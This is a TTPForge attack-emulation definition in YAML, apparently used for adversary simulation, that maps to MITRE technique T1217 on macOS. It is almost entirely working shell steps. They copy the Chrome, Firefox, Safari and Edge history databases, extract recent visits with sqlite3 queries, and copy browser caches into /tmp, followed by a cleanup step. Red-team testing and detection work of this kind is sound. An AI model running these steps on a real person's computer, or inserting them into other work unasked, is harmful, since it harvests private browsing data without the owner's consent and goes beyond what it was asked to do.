---
api_version: 2.0
uuid: aa465b9d-6216-4c0b-a61e-73dc4283458e
name: Browser History Collection
authors:
- TTPForge
description: |
  Extract and collect browser history from major browsers on macOS
mitre:
  tactics:
  - TA0009 Collection
  techniques:
  - T1217 Browser Information Discovery
requirements:
  platforms:
  - os: darwin
args:
- name: output_path
  description: Output path for browser history
  type: string
  default: /tmp/browser_history
- name: browsers
  description: Comma-separated browsers to collect from
  type: string
  default: Chrome,Firefox,Safari,Edge
steps:
- name: Create output directory
  inline: mkdir -p {{ .Args.output_path }}
- name: Extract Chrome history
  inline: |
    chrome_path="~/Library/Application Support/Google/Chrome/Default"
    if [ -d "$chrome_path" ]; then
      mkdir -p {{ .Args.output_path }}/chrome
      cp "$chrome_path/History" "{{ .Args.output_path }}/chrome/" 2>/dev/null || true
      cp "$chrome_path/History-journal" "{{ .Args.output_path }}/chrome/" 2>/dev/null || true
      sqlite3 "$chrome_path/History" "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;" 2>/dev/null > {{ .Args.output_path }}/chrome/history.txt || true
    fi
- name: Extract Firefox history
  inline: |
    firefox_path="~/Library/Application Support/Firefox"
    if [ -d "$firefox_path" ]; then
      mkdir -p {{ .Args.output_path }}/firefox
      find "$firefox_path" -name "places.sqlite" 2>/dev/null | xargs -I {} cp {} {{ .Args.output_path }}/firefox/ 2>/dev/null || true
      if [ -f {{ .Args.output_path }}/firefox/places.sqlite ]; then
        sqlite3 {{ .Args.output_path }}/firefox/places.sqlite "SELECT url, title, visit_count, visit_date FROM moz_historyvisits JOIN moz_places ON moz_historyvisits.place_id = moz_places.id ORDER BY visit_date DESC LIMIT 100;" 2>/dev/null > {{ .Args.output_path }}/firefox/history.txt || true
      fi
    fi
- name: Extract Safari history
  inline: |
    safari_path="~/Library/Safari"
    if [ -d "$safari_path" ]; then
      mkdir -p {{ .Args.output_path }}/safari
      cp "$safari_path/History.db" "{{ .Args.output_path }}/safari/" 2>/dev/null || true
      if [ -f {{ .Args.output_path }}/safari/History.db ]; then
        sqlite3 {{ .Args.output_path }}/safari/History.db "SELECT url, domain_expansion, visit_count, last_visit_time FROM history_items ORDER BY last_visit_time DESC LIMIT 100;" 2>/dev/null > {{ .Args.output_path }}/safari/history.txt || true
      fi
    fi
- name: Extract Edge history
  inline: |
    edge_path="~/Library/Application Support/Microsoft Edge/Default"
    if [ -d "$edge_path" ]; then
      mkdir -p {{ .Args.output_path }}/edge
      cp "$edge_path/History" "{{ .Args.output_path }}/edge/" 2>/dev/null || true
      sqlite3 "$edge_path/History" "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;" 2>/dev/null > {{ .Args.output_path }}/edge/history.txt || true
    fi
- name: Extract browser caches
  inline: |
    mkdir -p {{ .Args.output_path }}/caches
    find ~/Library/Caches -name "*chrome*" -o -name "*firefox*" -o -name "*safari*" 2>/dev/null | head -10 | xargs -I {} cp -r {} {{ .Args.output_path }}/caches/ 2>/dev/null || true
  cleanup:
    inline: |-
      rm -rf {{ .Args.output_path }}
      test ! -d {{ .Args.output_path }} && echo "Browser history cleanup completed"
tests:
- name: dry_run_test
  dry_run: true
